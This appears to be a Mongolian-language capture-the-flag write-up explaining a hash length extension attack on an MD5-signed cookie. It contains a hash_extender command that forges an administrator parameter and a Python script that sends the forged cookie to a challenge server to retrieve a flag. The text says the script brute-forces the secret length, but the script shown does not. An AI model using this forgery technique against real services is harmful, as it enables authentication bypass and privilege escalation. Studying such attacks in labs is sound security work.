# Hash Length Extension Attack

Код харангуутаа дараах 3 шинж тэмдэг байвал энэ нь **Length Extension Attack** мөн:

- **Хэшлэх хэлбэр:** `md5($SECRET . $data)` эсвэл `sha1($SECRET . $data)` (Энэ нь `hash_hmac` биш байх).
- **Түлхүүрийн урт:** `secret_length` гэсэн утга ил байгаа эсвэл өгөгдөл дотор байгаа.
- **Параметр ашиглалт:** `explode('&', ...)` эсвэл `parse_str()` ашиглан хамгийн сүүлийн утгыг авч байгаа (Parameter Pollution).

### hash_extender download

```bash
git clone https://github.com/iagox86/hash_extender
cd hash_extender
make
```

### hash_extender хэрэглээ

`hash_extender` ашиглан бид тэрхүү "зогсож байсан" төлөвөөс (хэшээс) эхлэн тооцооллыг үргэлжлүүлсэн.

- **Padding:** MD5 нь блок бүрийг 64 байт болгохын тулд ард нь "хоосон зай" (Padding) авдаг. Бидний тэр хачин `%80%00...` гээд байсан утга бол энэ "хоосон зай" юм.
- **Append:** Энэ хоосон зайн ард бид өөрийнхөө вагоныг буюу `&username=administrator` гэдгийг залгачихсан.
- **Үр дүн:** Сервер үүнийг тооцоолохдоо `SECRET + original_data + padding + new_data` гэж бүхэлд нь хараад, бидний "зохиосон" шинэ хэштэй яг таарна гэж баталгаажуулсан.

```bash
./hash_extender --data 'username=guest&date=2026-02-16T15:42:00+0800&secret_length=8&' \
              --secret 8 \
              --signature 7638405731f3313b55017b39dbecd817 \
              --format md5 \
              --append '&username=administrator'
```

[image]

### Automate script

Би чамд зориулаад `secret_length`-ийг нь мэдэхгүй байсан ч автоматаар тааж (brute-force), халдлагаа гүйцэтгэх **Python** скрипт бэлдлээ. Чи зөвхөн `original_hmac` болон `original_data`-г нь солиод л болоо.

```python
import requests
import urllib.parse

# 1. СЕРВЕРИЙН МЭДЭЭЛЭЛ
url = "http://139.162.5.230:10329/index.php"

# 2. HASH_EXTENDER-ЭЭС ГАРСАН УТГУУД
hmac = "97920a3330e667773f7850b453cb2704"
new_string_hex = "757365726e616d653d677565737426646174653d323032362d30322d31365431353a34323a30302b30383030267365637265745f6c656e6774683d3826800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000280200000000000026757365726e616d653d61646d696e6973747261746f72"

# 3. БОЛОВСРУУЛАЛТ
cookie_data = bytes.fromhex(new_string_hex)
final_cookie_val = hmac.encode() + b"|" + cookie_data
encoded_cookie = urllib.parse.quote_from_bytes(final_cookie_val)

# 4. ИЛГЭЭХ
headers = {
    "Cookie": f"auth={encoded_cookie}"
}

print(f"[*] Payload илгээж байна...")
r = requests.get(url, headers=headers)

print("-" * 30)
if "HZ19{" in r.text:
    print("[+] FLAG ОЛДЛОО!")
    import re
    flag = re.search(r"HZ19\{.*?\}", r.text)
    print(f"--> {flag.group(0)}")
else:
    print("[-] Амжилтгүй. Response-ийг шалгана уу:")
    print(r.text)
```
